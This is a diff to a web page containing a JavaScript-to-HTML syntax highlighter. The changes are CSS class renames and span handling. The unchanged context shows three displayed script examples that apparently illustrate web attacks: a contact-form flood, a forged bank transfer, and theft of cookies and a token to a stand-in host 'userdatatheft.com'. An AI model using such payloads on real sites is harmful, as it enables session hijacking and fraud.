@@ -328,14 +328,15 @@
                 display: block;
                 padding: 5px;
                 border: solid 1px #dddddd;
-                overflow-x: auto;
+                overflow: auto;
+                max-height: 240px;
             }
 
             code.html .tag {
                 color: #800009;
             }
 
-            code.html .brace {
+            code.html .tag-brace {
                 color: #132DFF;
             }
 
@@ -1242,13 +1243,13 @@
                                     <p>
                                         <span>
                                             <code class="code-block html js">
-                                                <span class="line"><span class="brace">&lt;</span><span class="tag">script</span><span class="brace">&gt;</span></span>
+                                                <span class="line"><span class="tag-brace">&lt;</span><span class="tag">script</span><span class="tag-brace">&gt;</span></span>
                                                 <br /><span class="line">&nbsp;&nbsp;<span class="method">setInterval</span>(<span class="method"></span>(<span class="normal"></span>)<span class="normal"></span> <span class="normal"></span>=<span class="normal"></span>><span class="normal"></span> <span class="normal"></span>{</span>
                                                 <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">const</span> <span class="normal">xmlHttp</span> <span class="normal"></span>=<span class="normal"></span> <span class="decl">new</span> <span class="class">XMLHttpRequest</span>(<span class="normal"></span>)<span class="normal"></span>;</span>
                                                 <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">xmlHttp</span>.<span class="method">open</span>(<span class="string">'POST'</span><span class="normal"></span>,<span class="normal"></span> <span class="string">'https://attackablesite.com/contactme'</span><span class="normal"></span>,<span class="normal"></span> <span class="decl">true</span>)<span class="normal"></span>;</span>
                                                 <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">xmlHttp</span>.<span class="method">send</span>(<span class="string">'subject=Your+site+is+down'</span><span class="normal"></span>)<span class="normal"></span>;</span>
                                                 <br /><span class="line">&nbsp;&nbsp;<span class="normal"></span>}<span class="normal"></span>,<span class="normal"></span> <span class="normal">1000</span>)<span class="normal"></span>;</span>
-                                                <br /><span class="line"><span class="brace">&lt;/</span><span class="tag">script</span><span class="brace">&gt;</span></span>
+                                                <br /><span class="line"><span class="tag-brace">&lt;/</span><span class="tag">script</span><span class="tag-brace">&gt;</span></span>
                                             </code>
                                         </span>
                                     </p>
@@ -1267,11 +1268,11 @@
                                     <p>
                                         <span>
                                             <code class="code-block html js">
-                                                <span class="line"><span class="brace">&lt;</span><span class="tag">script</span><span class="brace">&gt;</span></span>
+                                                <span class="line"><span class="tag-brace">&lt;</span><span class="tag">script</span><span class="tag-brace">&gt;</span></span>
                                                 <br /><span class="line">&nbsp;&nbsp;<span class="decl">const</span> <span class="normal">xmlHttp</span> <span class="normal"></span>=<span class="normal"></span> <span class="decl">new</span> <span class="class">XMLHttpRequest</span>(<span class="normal"></span>)<span class="normal"></span>;</span>
                                                 <br /><span class="line">&nbsp;&nbsp;<span class="normal">xmlHttp</span>.<span class="method">open</span>(<span class="string">'POST'</span><span class="normal"></span>,<span class="normal"></span> <span class="string">'https://somenotsafeuserbank.com/transfers'</span><span class="normal"></span>,<span class="normal"></span> <span class="decl">true</span>)<span class="normal"></span>;</span>
                                                 <br /><span class="line">&nbsp;&nbsp;<span class="normal">xmlHttp</span>.<span class="method">send</span>(<span class="string">'receivingaccount=malicious&amount=100'</span><span class="normal"></span>)<span class="normal"></span>;</span>
-                                                <br /><span class="line"><span class="brace">&lt;/</span><span class="tag">script</span><span class="brace">&gt;</span></span>
+                                                <br /><span class="line"><span class="tag-brace">&lt;/</span><span class="tag">script</span><span class="tag-brace">&gt;</span></span>
                                             </code>
                                         </span>
                                     </p>
@@ -1292,11 +1293,11 @@
                                     <p>
                                         <span>
                                             <code class="code-block html js">
-                                                <span class="line"><span class="brace">&lt;</span><span class="tag">script</span><span class="brace">&gt;</span></span>
+                                                <span class="line"><span class="tag-brace">&lt;</span><span class="tag">script</span><span class="tag-brace">&gt;</span></span>
                                                 <br /><span class="line">&nbsp;&nbsp;<span class="decl">const</span> <span class="normal">xmlHttp</span> <span class="normal"></span>=<span class="normal"></span> <span class="decl">new</span> <span class="class">XMLHttpRequest</span>(<span class="normal"></span>)<span class="normal"></span>;</span>
                                                 <br /><span class="line">&nbsp;&nbsp;<span class="normal">xmlHttp</span>.<span class="method">open</span>(<span class="string">'POST'</span><span class="normal"></span>,<span class="normal"></span> <span class="string">'https://userdatatheft.com/'</span><span class="normal"></span>,<span class="normal"></span> <span class="decl">true</span>)<span class="normal"></span>;</span>
                                                 <br /><span class="line">&nbsp;&nbsp;<span class="normal">xmlHttp</span>.<span class="method">send</span>(<span class="string">'cookie='</span><span class="normal"></span> <span class="normal"></span>+<span class="normal"></span> <span class="normal">document</span>.<span class="normal">cookie</span> <span class="normal"></span>+<span class="normal"></span> <span class="string">'&token='</span><span class="normal"></span> <span class="normal"></span>+<span class="normal"></span> <span class="normal">window</span>.<span class="normal">localStorage</span>.<span class="method">getItem</span>(<span class="string">'token'</span><span class="normal"></span>)<span class="normal"></span>)<span class="normal"></span>;</span>
-                                                <br /><span class="line"><span class="brace">&lt;/</span><span class="tag">script</span><span class="brace">&gt;</span></span>
+                                                <br /><span class="line"><span class="tag-brace">&lt;/</span><span class="tag">script</span><span class="tag-brace">&gt;</span></span>
                                             </code>
                                         </span>
                                     </p>
@@ -1375,7 +1376,7 @@
                             create: function (options) {
                                 let _codeCss = 'code-block html js';
                                 let _tagCss = 'tag';
-                                let _braceCss = 'brace';
+                                let _tagBraceCss = 'tag-brace';
                                 let _declarationCss = 'decl';
                                 let _statementCss = 'stmnt';
                                 let _classCss = 'class';
@@ -1383,6 +1384,7 @@
                                 let _stringCss = 'string';
                                 let _stringEscCss = 'escape';
                                 let _normalCss = 'normal';
+                                let _specialCharCss = 'special-char';
                                 let _lineCss = 'line';
                                 let _initialIndent = 0;
 
@@ -1439,23 +1441,33 @@
                                                     stringLiteralQuote = ch;
 
                                                     resultLine += '<span class="' + _stringCss + '">';
-                                                    resultLine += ch;
+                                                    resultLine += '<span class="' + _specialCharCss + '">' + ch + '</span>';
                                                 }
                                                 else if (stringLiteralQuote === ch) {
                                                     stringLiteral = false;
 
-                                                    resultLine += ch;
+                                                    resultLine += '<span class="' + _specialCharCss + '">' + ch + '</span>';
                                                     resultLine += '</span>';
                                                 }
                                                 else {
-                                                    resultLine += ch;
+                                                    resultLine += '<span class="' + _specialCharCss + '">' + ch + '</span>';
                                                 }
                                             }
                                             else if (!stringLiteral) {
                                                 if ((_separators.indexOf(ch) >= 0) || (_spaces.indexOf(ch) >= 0)) {
                                                     const lexemeType = _getLexemeType(lexeme, prevLexeme, ch);
                                                     const lexemeCss = _getLexemeCss(lexemeType);
-                                                    resultLine += '<span class="' + lexemeCss + '">' + lexeme + '</span>' + ch;
+
+                                                    if (lexeme) {
+                                                        resultLine += '<span class="' + lexemeCss + '">' + lexeme + '</span>';
+                                                    }
+
+                                                    if (_spaces.indexOf(ch) >= 0) {
+                                                        resultLine += ch;
+                                                    }
+                                                    else {
+                                                        resultLine += '<span class="' + _specialCharCss + '">' + ch + '</span>';
+                                                    }
 
                                                     if (lexeme == 'if' || lexeme == 'else' || lexeme == 'switch' || lexeme == 'case' || lexeme == 'default' || lexeme == 'for' || lexeme == 'while') {
                                                         indentChangeStmnt += 1;
@@ -1487,13 +1499,13 @@
                                             }
                                             else {
                                                 if (ch == '<') {
-                                                    resultLine += '&lt;';
+                                                    resultLine += '<span class="' + _specialCharCss + '">&lt;</span>';
                                                 }
                                                 else if (ch == '>') {
-                                                    resultLine += '&gt;';
+                                                    resultLine += '<span class="' + _specialCharCss + '">&gt;</span>';
                                                 }
                                                 else {
-                                                    resultLine += ch;
+                                                    resultLine += '<span class="' + _specialCharCss + '">' + ch + '</span>';
                                                 }
                                             }
 
@@ -1527,7 +1539,7 @@
                                         if (indentChangeBrace < 0) {
                                             indent -= 1;
                                         }
-                                         
+
                                         for (let i = 0; i < indent; i++) {
                                             resultLine = '&nbsp;&nbsp;' + resultLine;
                                         }
@@ -1560,8 +1572,8 @@
                                     if ((options.tagCss) || (options.tagCss === '')) {
                                         _tagCss = options.tagCss;
                                     }
-                                    if ((options.braceCss) || (options.braceCss === '')) {
-                                        _braceCss = options.braceCss;
+                                    if ((options.tagBraceCss) || (options.tagBraceCss === '')) {
+                                        _tagBraceCss = options.tagBraceCss;
                                     }
                                     if ((options.declarationCss) || (options.declarationCss === '')) {
                                         _declarationCss = options.declarationCss;
@@ -1583,6 +1595,9 @@
                                     }
                                     if ((options.normalCss) || (options.normalCss === '')) {
                                         _normalCss = options.normalCss;
+                                    }
+                                    if ((options.specialCharCss) || (options.specialCharCss === '')) {
+                                        _specialCharCss = options.specialCharCss;
                                     }
                                     if ((options.lineCss) || (options.lineCss === '')) {
                                         _lineCss = options.lineCss;
@@ -1610,7 +1625,7 @@
                                     if (lexemeType === 'tag')
                                         return _tagCss;
                                     if (lexemeType === 'brace')
-                                        return _braceCss;
+                                        return _tagBraceCss;
                                     if (lexemeType === 'declaration')
                                         return _declarationCss;
                                     if (lexemeType === 'statement')
@@ -1633,7 +1648,7 @@
                     function Code2HtmlSample() {
                         const options = {
                             tagCss: '',
-                            braceCss: '',
+                            tagBraceCss: '',
                             declarationCss: '',
                             statementCss: '',
                             classCss: '',
@@ -1661,7 +1676,7 @@
                     }
 
                     function Code2HtmlShowSelfCode() {
-                        const code = document.getElementById('code-to-html-script').innerText;
+                        const code = document.getElementById('code-to-html-script').innerHTML;
                         const html = Code2Html.create().convert(code);
                         document.getElementById('code-to-html-self').innerHTML = html;
                     }
@@ -1690,9 +1705,6 @@
                     </div>
                     <div class="block">
                         <div class="title"><h1>The convertor code</h1></div>
-                        <div>
-                            <p><span class="highlighted-red"><i>Not ready to be shown.</i></span></p>
-                        </div>
                         <div><p><span id="code-to-html-self"><code class="code-block" style="min-height:60px"></code></span></p></div>
                     </div>
                 </div>
